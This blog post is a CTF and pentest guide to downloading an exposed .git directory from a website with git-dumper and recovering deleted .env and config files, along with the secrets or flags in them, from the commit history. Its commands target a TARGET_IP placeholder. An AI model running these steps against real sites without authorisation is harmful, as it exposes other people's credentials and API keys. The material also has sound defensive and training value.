---
title: 'Git Secrets Hunter – Quick Guide'
author: saramazal
date: 2025-08-20
categories: ['Git']
tags: [git, git dumper, .git, repo, github, commit,secret recovery]     # TAG names should always be lowercase
img_path: /images/covers
image:
  path: /images/covers/town5.jpg
---

A step-by-step guide to recover sensitive information from an exposed Git repository.

## **1️⃣ Install git-dumper on Kali**

Git-dumper automates downloading an exposed `.git` folder.

```bash
# Clone git-dumper
git clone https://github.com/arthaud/git-dumper.git
cd git-dumper

# Create a Python 3 virtual environment (recommended)
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install dulwich PySocks requests requests-pkcs12
````

> ⚠️ If pip complains about system packages, always use a virtual environment.

---

## **2️⃣ Dump the exposed Git repository**

```bash
python3 git_dumper.py http://TARGET_IP/.git/ repo
cd repo
```

* `TARGET_IP` = IP of the site with exposed `.git`.
* The repo will be saved in `repo/`.

---

## **3️⃣ Check commit history**

```bash
git log --oneline --all
```

* Look for commits that **added sensitive files** (like `.env` or config files)
* Identify commits that **removed them**.

Example:

```
9a1e71a  Add deployment script + environment config
6d48072  Remove sensitive environment file
```

---

## **4️⃣ Restore deleted files from a previous commit**

```bash
# Restore files from the commit BEFORE deletion
git checkout 9a1e71a -- .
```

* Lists all files from that snapshot:

```bash
ls -la
```

---

## **5️⃣ Search for the flag or secrets**

```bash
# Directly grep for keywords like 'flag'
grep -Ri "flag" .
```

* Or inspect specific files:

```bash
cat .env
cat config.js
```

---

## **6️⃣ Key Takeaways**

* Git keeps **full history**, even for deleted files.
* `.env` or `config` files often contain API keys, credentials, or flags.
* Always check **commits before sensitive removal** during pentests/CTFs.
* Tools like **git-dumper** or **DVCS-Pillage** speed up recon, but manual Git commands always work.

---

### **Example Flag Found**

```bash
FLAG=5xxxxxxx-xxxxxx-xxxxxx0
```

---

## **References**

* [Git-dumper GitHub](https://github.com/arthaud/git-dumper)
* [DVCS-Pillage GitHub](https://github.com/evilpacket/DVCS-Pillage)
* [Git Documentation](https://git-scm.com/doc)

```
## Great! Happy Hunting 🔎
``` Trace the packets. Follow the crumbs.  
Silence is opsec — but sharing is rebellion.```

**Mazal Tov // Stay rooted** 🕶️